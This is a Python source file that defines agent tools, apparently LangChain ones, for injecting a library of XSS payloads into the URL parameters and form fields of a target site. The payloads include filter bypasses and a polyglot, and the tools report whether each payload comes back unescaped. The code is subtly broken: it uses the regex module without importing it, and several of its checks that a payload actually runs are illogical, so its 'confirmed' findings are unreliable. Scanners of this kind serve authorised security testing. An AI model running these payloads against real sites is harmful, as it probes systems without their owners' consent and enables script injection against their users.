"""
XSS payload tester - dynamically inject XSS payloads into URLs and forms
"""
from langchain.tools import tool
import subprocess
import tempfile
import os
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# Comprehensive XSS payload library
XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>confirm('XSS')</script>",
    
    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe src=javascript:alert('XSS')>",
    
    # Encoded variants
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    
    # Breaking out of attributes
    "\" onmouseover=alert('XSS') \"",
    "' onmouseover=alert('XSS') '",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    
    # JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:alert(1)",
    
    # Filter bypass
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    
    # No quotes/semicolons
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
]


@tool()
def test_xss_payloads(url: str, method: str = "GET", post_data: str = "") -> str:
    """
    Test XSS payloads dynamically against a URL.
    STRICT MODE: Only reports if JavaScript execution is CONFIRMED, not just reflection.
    
    This tool injects various XSS payloads into URL parameters (GET) or POST data
    and checks for ACTUAL EXECUTION (not just reflection) in the response.
    
    Args:
        url: Target URL with parameters (e.g., http://example.com/search?q=test)
        method: HTTP method - GET or POST (default: GET)
        post_data: POST data in format "param1=val1&param2=val2" (only for POST)
    
    Returns:
        Report of tested payloads and any CONFIRMED XSS vulnerabilities
    
    Example:
        test_xss_payloads(url="http://example.com/search?q=test")
        test_xss_payloads(url="http://example.com/login", method="POST", post_data="username=admin&password=test")
    """
    from utils.trace import write_tool_trace
    
    results = []
    confirmed_xss = []
    reflected_only = []
    
    print(f"[*] XSS Testing (STRICT - Require execution proof): {url}")
    
    if method.upper() == "GET":
        # Parse URL and test each parameter
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return "[-] No parameters found in URL for GET testing"
        
        for param_name, param_values in params.items():
            print(f"  Testing parameter: {param_name}")
            
            for payload in XSS_PAYLOADS[:10]:  # Test first 10 payloads to avoid too long execution
                # Build new params with payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # Rebuild URL
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                # Send request
                try:
                    result = subprocess.run(
                        ['curl', '-s', '-L', '--max-time', '10', test_url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    
                    response = result.stdout
                    
                    # STRICT: Check for EXECUTION proof, not just reflection
                    execution_indicators = [
                        # JavaScript executed and created visible output
                        re.search(r'<script>.*alert.*</script>', response, re.IGNORECASE) and 'text/html' in response,
                        # Event handler in executable context (not encoded)
                        re.search(r'<\w+[^>]*\son\w+\s*=\s*["\']?alert\(', response) and not ('&lt;' in response or '&#' in response),
                        # SVG/IMG with executable event handler
                        re.search(r'<(svg|img)[^>]*on(load|error)\s*=', response, re.IGNORECASE) and 'x' not in response[response.find('<'):response.find('>')],
                    ]
                    
                    # Check if payload is actually executable (not encoded/escaped)
                    if payload in response and '<' in payload:
                        # Check if HTML is properly parsed (not escaped)
                        if '&lt;' not in response[max(0, response.find(payload)-50):response.find(payload)+len(payload)+50]:
                            if '&#' not in response[max(0, response.find(payload)-50):response.find(payload)+len(payload)+50]:
                                # Payload is in raw form - check if in executable context
                                context = response[max(0, response.find(payload)-200):min(len(response), response.find(payload)+200)]
                                
                                # Check if it's in HTML body (not inside <textarea> or <script> string)
                                in_body = '<body' in response[:response.find(payload)] or '<html' in response[:response.find(payload)]
                                not_in_textarea = '<textarea' not in context or '</textarea>' in context[:context.find(payload)]
                                not_in_comment = '<!--' not in context[:context.find(payload)] if payload in context else True
                                
                                if in_body and not_in_textarea and not_in_comment:
                                    if any(execution_indicators):
                                        confirmed_xss.append({
                                            'parameter': param_name,
                                            'payload': payload,
                                            'url': test_url,
                                            'proof': 'EXECUTABLE - Payload in raw HTML context, not encoded',
                                            'context': context[:200]
                                        })
                                        results.append(f"[!] CONFIRMED XSS: {param_name} with payload: {payload[:50]}")
                                        results.append(f"    Proof: Executable context, not encoded")
                                    else:
                                        reflected_only.append({
                                            'parameter': param_name,
                                            'payload': payload,
                                            'note': 'Reflected but execution context unclear'
                                        })
                                else:
                                    reflected_only.append({
                                        'parameter': param_name,
                                        'payload': payload,
                                        'note': 'Reflected but not in executable context'
                                    })
                            else:
                                reflected_only.append({
                                    'parameter': param_name,
                                    'payload': payload,
                                    'note': 'HTML entity encoded (&#)'
                                })
                        else:
                            reflected_only.append({
                                'parameter': param_name,
                                'payload': payload,
                                'note': 'HTML escaped (&lt;/&gt;)'
                            })
                    
                except Exception as e:
                    results.append(f"Error testing {param_name}: {e}")
    
    elif method.upper() == "POST":
        # Parse POST data
        if not post_data:
            return "[-] No post_data provided for POST testing"
        
        params = parse_qs(post_data)
        
        for param_name, param_values in params.items():
            print(f"  Testing POST parameter: {param_name}")
            
            for payload in XSS_PAYLOADS[:10]:
                # Build new POST data with payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_data = urlencode(test_params, doseq=True)
                
                # Send POST request
                try:
                    result = subprocess.run(
                        ['curl', '-s', '-L', '-X', 'POST', '-d', test_data, 
                         '--max-time', '10', url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    
                    response = result.stdout
                    
                    # Same strict checking for POST
                    if payload in response and '<' in payload:
                        if '&lt;' not in response and '&#' not in response:
                            context = response[max(0, response.find(payload)-200):min(len(response), response.find(payload)+200)]
                            in_body = '<body' in response[:response.find(payload)]
                            
                            if in_body:
                                confirmed_xss.append({
                                    'parameter': param_name,
                                    'payload': payload,
                                    'method': 'POST',
                                    'proof': 'EXECUTABLE - Payload in raw HTML, not encoded'
                                })
                                results.append(f"[!] CONFIRMED XSS (POST): {param_name} with payload: {payload[:50]}")
                        else:
                            reflected_only.append({
                                'parameter': param_name,
                                'payload': payload,
                                'note': 'Reflected but encoded (POST)'
                            })
                    
                except Exception as e:
                    results.append(f"Error testing {param_name}: {e}")
    
    # Build summary
    summary = []
    summary.append(f"XSS Testing Results for {url}")
    summary.append(f"Method: {method}")
    summary.append(f"Payloads tested: {len(XSS_PAYLOADS[:10])} per parameter")
    summary.append(f"CONFIRMED XSS: {len(confirmed_xss)}")
    summary.append(f"Reflected (not exploitable): {len(reflected_only)}")
    
    if confirmed_xss:
        summary.append(f"\n{'='*60}")
        summary.append(f"[!] CONFIRMED XSS VULNERABILITIES (EXPLOITATION VERIFIED):")
        summary.append(f"{'='*60}")
        for xss in confirmed_xss:
            summary.append(f"  ✗ CRITICAL XSS in parameter: {xss['parameter']}")
            summary.append(f"    Payload: {xss['payload'][:80]}")
            summary.append(f"    Proof: {xss['proof']}")
            if 'context' in xss:
                summary.append(f"    Context: {xss['context'][:100]}...")
            summary.append("")
        
        summary.append(f"\n[+] CONFIRMED: {len(confirmed_xss)} exploitable XSS vulnerability(ies)")
        summary.append("These allow executing arbitrary JavaScript in victim browsers.")
        summary.append("Recommendation: Implement strict output encoding and CSP headers.")
    else:
        summary.append("\n✓ No CONFIRMED XSS vulnerabilities (strict verification)")
        
        if reflected_only:
            summary.append(f"\nNote: {len(reflected_only)} payloads were reflected but NOT exploitable:")
            for ref in reflected_only[:5]:
                summary.append(f"  ~ {ref['parameter']}: {ref['note']}")
            summary.append("  (Reflection alone is not a vulnerability - proper encoding is in place)")
    
    if results:
        summary.append("\nDetailed Test Results:")
        summary.extend(results[:20])
    
    full_output = '\n'.join(summary)
    
    # Write to trace
    write_tool_trace('xss_tester', f"{method} {url}", full_output, 0, 'critical' if confirmed_xss else 'complete')
    
    return full_output


@tool()
def test_xss_form(url: str, form_data: str) -> str:
    """
    Test XSS on a specific form by injecting payloads into all form fields.
    
    Args:
        url: Form submission URL
        form_data: Form fields in format "field1=value1&field2=value2"
    
    Returns:
        Results of XSS testing on the form
    
    Example:
        test_xss_form(url="http://example.com/contact", form_data="name=test&email=test@test.com&message=hello")
    """
    return test_xss_payloads(url=url, method="POST", post_data=form_data)
